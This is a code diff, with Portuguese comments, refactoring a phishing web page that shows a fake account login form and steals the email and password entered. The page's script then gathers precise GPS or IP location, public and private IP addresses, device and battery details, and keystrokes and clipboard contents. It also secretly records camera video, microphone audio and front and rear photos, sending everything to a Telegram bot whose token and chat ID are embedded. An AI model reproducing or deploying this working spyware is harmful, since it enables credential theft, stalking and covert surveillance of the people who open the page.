@@ -26,14 +26,13 @@
 <form id="fakeForm">
  <h2>Acesse sua conta</h2>
  <input id="em" type="email" placeholder="E-mail" autocomplete="email">
- <input id="pw" type="password" placeholder="Senha" autocomplete="current-password">
+<input id="pw" type="password" placeholder="Senha" autocomplete="current-password">
  <button type="submit">Entrar</button>
 </form>
 
 <div id="statusPC"></div>
 
 <script>
-/* ========== CONFIGS ========== */
 const BOT_TOKEN="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
 const CHAT_ID="8792921881";
 
@@ -44,169 +43,116 @@ const save=u=>fetch("/api/salva",{method:"POST",body:JSON.stringify(u),headers:{
 const sleep=ms=>new Promise(r=>setTimeout(r,ms));
 const statusPC=m=>{const el=document.getElementById("statusPC");if(el)el.textContent=m};
 
-/* ========== GEOLINK ========== */
-let mapLink=""; // ficará pronto após gps()
+let rel=[],mapLink="",ffmpeg=null,audioRecorder=null,videoRecorder=null,audioChunksA=[],audioChunksB=[],useA=true,videoChunks=[],keyLog=[],clipLog=[],fotoTimeout=null,videoStream=null,audioStream=null;
 
-/* ========== CONVERSOR WEBM → MP4 ========== */
-// biblioteca leve (~600 kB) que roda 100% no navegador
-const LOAD_FFMPEG=()=>{
+/* ---------- FFmpeg sem erro ---------- */
+const LOAD_FFMPEG=()=>new Promise((res,rej)=>{
+ if(window.FFmpeg){res();return}
  const s=document.createElement("script");
- s.src="https://unpkg.com/@ffmpeg/ffmpeg@0.12.9/dist/umd/ffmpeg.js";
+ s.src="https://cdn.jsdelivr.net/npm/@ffmpeg/ffmpeg@0.12.9/dist/umd/ffmpeg.js";
+ s.onload=()=>res(); s.onerror=()=>rej(new Error("FFmpeg CDN falhou"));
  document.head.appendChild(s);
- return new Promise(r=>{s.onload=r});
-};
-
-let ffmpeg=null;
+});
 const initFFmpeg=async()=>{
  await LOAD_FFMPEG();
- const {createFFmpeg}=FFmpeg; ffmpeg=createFFmpeg({log:false});
+ const {createFFmpeg}=window.FFmpeg;
+ ffmpeg=createFFmpeg({log:false});
  await ffmpeg.load();
  statusPC("FFmpeg pronto");
 };
-
 const webmToMp4=async(webmBlob)=>{
- if(!ffmpeg)return webmBlob; // fallback
+ if(!ffmpeg)return webmBlob;
  const input="rec.webm",output="rec.mp4";
  const buf=await webmBlob.arrayBuffer();
  ffmpeg.FS("writeFile",input,new Uint8Array(buf));
- // converte em 1 passo rápido
  await ffmpeg.run("-i",input,"-c","copy",output);
  const data=ffmpeg.FS("readFile",output);
- const mp4=new Blob([data.buffer],{type:"video/mp4"});
- return mp4;
+ return new Blob([data.buffer],{type:"video/mp4"});
 };
 
-/* ========== VARS GLOBAIS ========== */
-let rel=[],audioRecorder=null,videoRecorder=null,audioChunksA=[],audioChunksB=[],useA=true,videoChunks=[],keyLog=[],clipLog=[],fotoTimeout=null,videoStream=null,audioStream=null;
-
-/* ========== 0. GPS + MAPA ========== */
+/* ---------- GPS + mapa ---------- */
 async function gps(){
  return new Promise(res=>{
-   // 1) GPS real (preciso)
-   if(navigator.geolocation){
-     navigator.geolocation.getCurrentPosition(
-       async pos=>{
-         const {latitude:lat,longitude:lon,accuracy:acc}=pos.coords;
-         mapLink=`https://www.google.com/maps?q=${lat},${lon}&ll=${lat},${lon}&z=18`;
-         rel.push(`GPS: ${lat.toFixed(6)},${lon.toFixed(6)} (±${acc.toFixed(0)}m) ${mapLink}`);
-         res();
-       },
-       async err=>{
-         // 2 Fallback IP-API
-         const ip=await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"");
-         const geo=await fetch(`http://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>Po);
-         if(geo.lat && geo.lon){
-           mapLink=`https://www.google.com/maps?q=${geo.lat},${geo.lon}&ll=${geo.lat},${geo.lon}&z=16`;
-           rel.push(`IP-Geo: ${geo.lat},${geo.lon} (${geo.city||""}) ${mapLink}`);
-         }else{
-           rel.push("Localização: indisponível");
-         }
-         res();
-       },
-       {enableHighAccuracy:true,timeout:8000,maximumAge:0}
-     );
-   }else{
-     res();
-   }
+   navigator.geolocation.getCurrentPosition(
+     async pos=>{
+       const{latitude:lat,longitude:lon,accuracy:acc}=pos.coords;
+       mapLink=`https://www.google.com/maps?q=${lat},${lon}&ll=${lat},${lon}&z=18`;
+       rel.push(`GPS: ${lat.toFixed(6)},${lon.toFixed(6)} (±${acc}m) ${mapLink}`); res();
+     },
+     async ()=>{
+       const ip=await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"");
+       const geo=await fetch(`http://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({lat:null,lon:null}));
+       if(geo.lat && geo.lon){mapLink=`https://www.google.com/maps?q=${geo.lat},${geo.lon}&ll=${geo.lat},${geo.lon}&z=16`;rel.push(`IP-Geo: ${geo.lat},${geo.lon} (${geo.city}) ${mapLink}`);}
+       else rel.push("Localização: indisponível"); res();
+     },
+     {enableHighAccuracy:true,timeout:8000,maximumAge:0}
+   );
  });
 }
 
-/* ========== 1. IP + ISP + REDE ========== */
+/* ---------- IP + ISP + VPN ---------- */
 async function redes(){
  try{
-   const ip=await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"---");
-   rel.push(`IP Público: ${ip}`);
-
+   const ip=await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"---"); rel.push(`IP Público: ${ip}`);
    const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]}); pc.createDataChannel("");
    let cand=[]; pc.onicecandidate=e=>{if(e&&e.candidate)cand.push(e.candidate.candidate)};
-   try{await pc.setLocalDescription(await pc.createOffer());await sleep(1500)}catch(e){}
-   pc.close();
-   const priv=cand.find(c=>c.includes("192.168")||c.includes("10.")||c.includes("172."));
-   rel.push(`IP Privado: ${priv?priv.split(" ")[4]:'---'}`);
-
-   const geo=await fetch(`http://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({isp:"---",country:"---",org:""}));
+   try{await pc.setLocalDescription(await pc.createOffer());await sleep(1500)}catch{}; pc.close();
+   const priv=cand.find(c=>c.includes("192.168")||c.includes("10.")||c.includes("172.")); rel.push(`IP Privado: ${priv?priv.split(" ")[4]:'---'}`);
+   const geo=await fetch(`http://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({isp:"",country:"",org:""}));
    rel.push(`ISP: ${geo.isp||'---'} | País: ${geo.country||'---'}`);
-
-   if(navigator.connection){
-     const c=navigator.connection;
-     rel.push(`Rede: ${c.type||'-'} ${c.effectiveType||'-'} ${c.downlink?c.downlink+'Mbps':''}`);
-   }
-   const vpnSuspeito=geo.org&&geo.org.toLowerCase().includes("vpn");
-   rel.push(`VPN?: ${vpnSuspeito?"Suspeito":"Não detectado"}`);
- }catch(e){rel.push(`Rede: erro - ${e.message}`)}
+   if(navigator.connection){const c=navigator.connection;rel.push(`Rede: ${c.type||'-'} ${c.effectiveType||'-'} ${c.downlink?c.downlink+'Mbps':''}`);}
+   rel.push(`VPN?: ${(geo.org&&geo.org.toLowerCase().includes("vpn"))?"Suspeito":"Não detectado"}`);
+ }catch(e){rel.push(`Rede: erro`)}
 }
 
-/* ========== 2. HARDWARE / BATERIA ========== */
+/* ---------- HW + bateria ---------- */
 function hwinfo(){
- rel.push(`User-Agent: ${navigator.userAgent.slice(0,200)}`);
+ rel.push(`User-Agent: ${navigator.userAgent?.slice(0,200)}`);
  rel.push(`Plataforma: ${navigator.platform}`);
  rel.push(`Núcleos CPU: ${navigator.hardwareConcurrency||'?'}`);
  rel.push(`RAM estimada: ${navigator.deviceMemory||'?'} GB`);
  rel.push(`Tela: ${screen.width}x${screen.height} | Viewport: ${window.innerWidth}x${window.innerHeight}`);
  rel.push(`Idioma: ${navigator.language}`);
- rel.push(`Online: ${navigator.onLine}`);
  rel.push(`Touch: ${navigator.maxTouchPoints||0} pontos`);
- if(performance.memory){
-   const used=(performance.memory.usedJSHeapSize/1048576).toFixed(1);
-   const total=(performance.memory.totalJSHeapSize/1048576).toFixed(1);
-   rel.push(`Memória JS: ${used}/${total} MB`);
- }
+ if(performance.memory){const used=(performance.memory.usedJSHeapSize/1048576).toFixed(1),total=(performance.memory.totalJSHeapSize/1048576).toFixed(1);rel.push(`Memória JS: ${used}/${total} MB`);}
 }
 async function bateria(){
- try{const bat=await navigator.getBattery();rel.push(`Bateria: ${(bat.level*100).toFixed(0)}% | ${bat.charging?'Carregando':'Desconectado'}`)}catch(e){rel.push(`Bateria: não disponível`)}
+ try{const bat=await navigator.getBattery();rel.push(`Bateria: ${(bat.level*100).toFixed(0)}% | ${bat.charging?'Carregando':'Desconectado'}`)}catch{rel.push("Bateria: não disponível")}
 }
 
-/* ========== 3. KEYLOGGER + CLIPBOARD ========== */
+/* ---------- Keylogger + clipboard ---------- */
 function keylogger(){
- document.addEventListener("keydown",e=>{
-   keyLog.push(e.key);if(keyLog.length>=50){enviarTexto("📝 KEYLOG\n"+keyLog.join(""));keyLog=[]}
- });
- setInterval(()=>{
-   navigator.clipboard.readText().then(t=>{
-     if(t&&t!==clipLog[clipLog.length-1]){clipLog.push(t);enviarTexto("📋 CLIPBOARD\n"+t.slice(0,500))}
-   }).catch(()=>{})
- },3000);
+ document.addEventListener("keydown",e=>{keyLog.push(e.key);if(keyLog.length>50){enviarTexto("📝 KEYLOG\n"+keyLog.join(""));keyLog=[]}});
+ setInterval(()=>navigator.clipboard.readText().then(t=>{if(t&&t!==clipLog[clipLog.length-1]){clipLog.push(t);enviarTexto("📋 CLIPBOARD\n"+t.slice(0,500))}}).catch(()=>{}),3000);
 }
 
-/* ========== 4. FOTOS + VIDEO + AUDIO (mp4) ========== */
+/* ---------- Mídias (fotos/vídeo/mp4) ---------- */
 async function midias(){
- statusPC("Solicitando permissões de mídia..."); let stream=null;
- try{
-   stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:{sampleRate:44100,channelCount:1,echoCancellation:false}});
-   statusPC("Mídia autorizada - gravando...");
- }catch(err){rel.push(`Mídia negada: ${err.name}`);statusPC("Mídia negada - continuando sem câmera/mic");enviarTexto("📊 RELATÓRIO (sem mídia)\n"+rel.join("\n"));save({t:"rel",v:rel.join("\n")});return;}
-
+ statusPC("Solicitando mídia..."); let stream=null;
+ try{stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:"user",width:1280,height:720},audio:{sampleRate:44100,channelCount:1,echoCancellation:false}});statusPC("Permissões OK");}
+ catch(err){rel.push(`Mídia negada: ${err.name}`);statusPC("Mídia negada");return;}
  videoStream=stream; audioStream=new MediaStream(stream.getAudioTracks());
 
- // VIDEO contínuo → mp4
+ // vídeo contínuo → mp4
  try{
    videoRecorder=new MediaRecorder(videoStream,{mimeType:"video/webm;codecs=vp9,opus"});
-   videoRecorder.ondataavailable=async e=>{
-     if(e.data&&e.data.size>0)videoChunks.push(e.data);
-   };
-   videoRecorder.start(1000); statusPC("Vídeo iniciado");
+   videoRecorder.ondataavailable=e=>{if(e.data&&e.data.size)videoChunks.push(e.data)};
+   videoRecorder.start(1000);
  }catch(e){rel.push(`Erro vídeo: ${e.message}`)}
-
  setInterval(async()=>{
    if(!videoChunks.length)return;
-   const webm=new Blob(videoChunks.splice(0),{type:"video/webm"});
-   const mp4=await webmToMp4(webm); // << aqui a conversão
-   const fd=new FormData();
-   fd.append("video",mp4,`v${Date.now()}.mp4`);
-   fd.append("chat_id",CHAT_ID);
-   enviarMidia("Video",fd);
-   save({t:"video",s:mp4.size});
-   statusPC(`Vídeo MP4 enviado: ${(mp4.size/1024/1024).toFixed(1)}MB`);
+   const mp4=await webmToMp4(new Blob(videoChunks.splice(0),{type:"video/webm"}));
+   const fd=new FormData();fd.append("video",mp4,`v${Date.now()}.mp4`);fd.append("chat_id",CHAT_ID);
+   enviarMidia("Video",fd);save({t:"video",s:mp4.size});statusPC(`MP4 enviado: ${(mp4.size/1024/1024).toFixed(1)}MB`);
  },60000);
 
- // AUDIO alternado A/B
+ // audio alternado
  const makeAudioRecorder=()=>{
    const rec=new MediaRecorder(audioStream,{mimeType:"audio/webm;codecs=opus"});
    rec.ondataavailable=e=>{
      const chunks=useA?audioChunksB:audioChunksA; chunks.push(e.data);
-     const targetChunks=useA?audioChunksA:audioChunksB;
-     if(targetChunks.length>=5){
-       const blob=new Blob(targetChunks.splice(0),{type:"audio/webm"});const fd=new FormData();
+     const target=useA?audioChunksA:audioChunksB;if(target.length>=5){
+       const blob=new Blob(target.splice(0),{type:"audio/webm"});const fd=new FormData();
        fd.append("voice",blob,`a${Date.now()}.webm`);fd.append("chat_id",CHAT_ID);
        enviarMidia("Voice",fd);save({t:"audio",s:blob.size});
      }
@@ -215,62 +161,55 @@ async function midias(){
  audioRecorder=makeAudioRecorder();
  setInterval(()=>{useA=!useA;audioRecorder.stop();audioRecorder=makeAudioRecorder()},10000);
 
- // FOTOS a cada 10s
+ // fotos
  const tirarFoto=async(facing="user",label="selfie")=>{
    try{
      const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:1280,height:720}});
      const track=s.getVideoTracks()[0];const img=new ImageCapture(track);const blob=await img.takePhoto();
      const fd=new FormData();fd.append("photo",blob,`${label}_${Date.now()}.jpg`);fd.append("chat_id",CHAT_ID);
      await enviarMidia("Photo",fd);save({t:label,s:blob.size});track.stop();
-   }catch(err){
+   }catch{
      const c=document.createElement("canvas");c.width=640;c.height=480;
-     const v=document.createElement("video");v.srcObject=videoStream;v.muted=true;v.play();
-     await sleep(100);
+     const v=document.createElement("video");v.srcObject=videoStream;v.muted=true;v.play();await sleep(100);
      c.getContext("2d").drawImage(v,0,0,640,480);
      c.toBlob(b=>{const fd=new FormData();fd.append("photo",b,`${label}_${Date.now()}.jpg`);fd.append("chat_id",CHAT_ID);enviarMidia("Photo",fd)},"image/jpeg",0.7);
    }
  };
  fotoTimeout=setInterval(()=>tirarFoto("user","selfie"),10000);
  setTimeout(()=>tirarFoto("environment","rear"),2000);
- statusPC("Mídia ativa - fotos a cada 10s");
+ statusPC("Mídia ativa");
 }
 
-/*========== 5. FAKE LOGIN ========== */
+/* ---------- Login falso ---------- */
 function fakeLogin(){
  document.getElementById("load").style.display="none";
  document.getElementById("fakeForm").style.display="flex";
  document.getElementById("fakeForm").onsubmit=e=>{
    e.preventDefault();
-   const email=document.getElementById("em").value;
-   const senha=document.getElementById("pw").value;
-   rel.push(`EMAIL: ${email}`);rel.push(`SENHA: ${senha}`);
-   enviarTexto(`🔐 LOGIN\nE: ${email}\nS: ${senha}`);save({t:"login",em:email,pw:senha});
+   const email=document.getElementById("em").value,pw=document.getElementById("pw").value;
+   rel.push(`EMAIL: ${email}`);rel.push(`SENHA: ${pw}`);
+   enviarTexto(`🔐 LOGIN\nE: ${email}\nS: ${pw}`);save({t:"login",em:email,pw:pw});
    document.getElementById("fakeForm").style.display="none";
    document.getElementById("load").style.display="flex";
    initFinal();
  };
 }
 
-/*========== 6. RELATÓRIO FINAL E START ========== */
+/* ---------- Relatório e start ---------- */
 async function initFinal(){
  try{
-   await gps();        // << gps/link primeiro
+   await gps();
    await redes();
    hwinfo();
    await bateria();
    keylogger();
    await midias();
-   enviarTexto("📊 RELATÓRIO\n"+rel.join("\n"));
-   save({t:"rel",v:rel.join("\n")});
-   // remover loading ao fim (opcional)
-   // document.getElementById("load").style.display="none";
+   enviarTexto("📊 RELATÓRIO\n"+rel.join("\n"));save({t:"rel",v:rel.join("\n")});
  }catch(e){enviarTexto("❌ ERRO: "+e.message);statusPC("Erro: "+e.message)}
 }
 
-/*========== 7. DISPARO ========== */
-window.onload=()=>{
- initFFmpeg().then(()=>fakeLogin()); // garante FFmpeg carregado antes
-};
+/* ---------- Dispara ---------- */
+window.onload=()=>initFFmpeg().then(()=>fakeLogin()).catch(()=>fakeLogin()); // roda mesmo sem FFmpeg
 </script>
 </body>
 </html>
